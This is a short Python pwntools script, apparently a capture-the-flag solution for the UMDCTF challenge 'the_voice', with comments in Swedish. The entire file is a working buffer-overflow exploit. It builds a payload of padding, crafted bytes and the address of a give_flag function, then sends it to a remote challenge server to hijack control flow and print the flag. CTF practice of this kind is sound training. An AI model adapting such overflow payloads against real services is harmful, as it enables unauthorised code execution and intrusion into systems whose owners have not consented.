from pwn import *

binary_path = './the_voice'
host = 'challs.umdctf.io' 
port = 31192

binary = ELF('the_voice')
give_flag_addr = binary.symbols['give_flag']


local = False 
if local:
    
    p = process(binary_path)
    p = gdb.debug(binary_path,  terminal=['tmux', 'new-window'])

else:
    p = remote(host, port)

payload = b'15'
payload += b'\x00'
payload += b'A' * 21
payload += b'\xcf\x27'
payload += b'\x00' * 6 
payload += b'\x01' + b'\00' * 7 
payload += p64(give_flag_addr)

# Skicka payloaden
p.sendline(payload)

# Ta emot och skriv ut svaret
print(p.recvall().decode())

# Stäng förbindelsen
p.close()

